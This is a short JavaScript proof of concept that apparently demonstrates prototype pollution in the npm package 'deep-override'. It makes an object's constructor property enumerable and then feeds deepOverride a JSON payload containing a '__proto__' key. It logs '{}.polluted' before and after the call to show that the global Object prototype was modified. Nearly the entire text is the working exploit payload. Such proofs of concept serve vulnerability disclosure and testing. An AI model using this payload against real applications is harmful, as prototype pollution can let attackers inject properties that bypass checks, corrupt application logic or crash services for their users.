var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const deepOverride = require('deep-override');
deepOverride(obj, JSON.parse('{ "__proto__": { "polluted": "yes" }}'));
console.log({}.polluted);